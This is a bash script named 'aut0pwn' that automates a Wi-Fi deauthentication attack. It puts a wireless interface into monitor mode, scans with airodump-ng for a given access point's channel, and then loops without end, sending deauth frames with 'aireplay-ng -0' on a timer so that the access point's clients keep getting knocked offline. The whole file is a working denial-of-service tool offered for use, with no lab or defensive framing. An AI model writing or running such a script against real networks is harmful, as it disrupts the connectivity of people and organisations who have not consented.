#!/usr/bin/bash

#title|aut0pwn
#version|0.1
#author|0ero1ne
#info|deauth every AP's clients

#TODO
#Check if I can use case instead of if

#Check if running as root
if [ "$EUID" -ne 0 ]; then
        printf "%s\n" "[X] Please run as root..."
        exit 1
fi

#Check if all the arguments have been typed
#TODO change args order and add timer
if [[ $# -ne 4 ]]; then
	printf "%s\n" "[X] sudo $0 <bssid> <packets> <timer> <interface>"
	exit 1
fi

#Assign each arguments to the local variables
bssid=$1
packets=$2
timer=$3
interface=$4
imon=${4}mon
dump=scan

#TODO
#Check if the interface is valid and in monitor mode
if [[ $(iw $interface info &>/dev/null; echo $?) -eq 1 ]]; then
	printf "%s\n" "[X] Please, give me a valid interface..."
	exit 1
else
	if [[ $(iw $interface info \
		| grep type \
		| cut -d' ' -f 2 \
		| tr -d ' ') == "managed" ]]; then
		
		printf "\n%s\n" "[?] Interface not in monitor mode..."

				
		#ifconfig $interface down
		#iwconfig $interface mode monitor
		#ip link set $interface name $imon
		#ifconfig $imon up
		airmon-ng check kill &> /dev/null
		airmon-ng start $interface &> /dev/null

		if [[ $(iwconfig $imon &>/dev/null; echo $?) -eq 0 ]]; then
			printf "%s" "[*] $imon is now up..."
		else
			printf "%s\n" "[X] Can't set $interface in monitor mode, please do it manually using airmon-ng."
			exit 1
		fi
	else
		printf "\n%s" "[*] Interface is in monitor mode..."
		imon=$interface
	fi
fi


#TODO  Replace variables with proper name
while true; do
	#clear

	while true; do
		#Scanning the network to check if target is up and grab the channel
		printf "\n\n%s" "[*] Scanning the network..."
		timeout --foreground 10s airodump-ng $imon --write $dump --output-format csv &> /dev/null
		
		if [[ -n $(cat $dump-01.csv | grep $bssid) ]]; then
			channel=$(cat $dump-01.csv \
				| grep $bssid \
				| head -n 1 \
				| cut -d',' -f 4 \
				| tr -d ' ')

	        	printf "\n[-] Host is up on channel %s...\n" "$channel"

			rm $dump-01.csv &>/dev/null
			break
		else
	        	printf "\n%s" "[X] Host is down..."
			rm $dump-01.csv &>/dev/null
		fi
	done

	#Set adapter on target's channel
	printf "%s\n" "[-] Setting $imon to channel $channel..."
        sudo ifconfig $imon down &>/dev/null
       	sudo iwconfig $imon channel $channel &>/dev/null
        sudo ifconfig $imon up &>/dev/null

	#Launching attack
	printf "%s\n" "[-] Launching attack..."
	counter=1
		while read -r line
		do
			if [[ $(echo $line | cut -d' ' -f 2 | tr -d ' ') == "Sending" ]]; then
				if [[ $packets -gt 0 ]]; then
					printf "[-] Packet %s of %s sent...\r" "$counter" "$packets"
				else
					printf "[-] %s packets sent...\r" "$counter"
				fi
            			counter=$((counter+1))
    			fi
		done < <(aireplay-ng -0 $packets -a $bssid $imon)

		# Attack is done, begin Tminus for next cycle
		i=0
		printf "\n\n%s\n" "[*] Done..."
		while [[ $i -ne $((timer+1)) ]]; do
			printf "%s\r" "[-] Next cycle in $((timer-$i))s..."
			sleep 1
			i=$((i+1))
		done
done
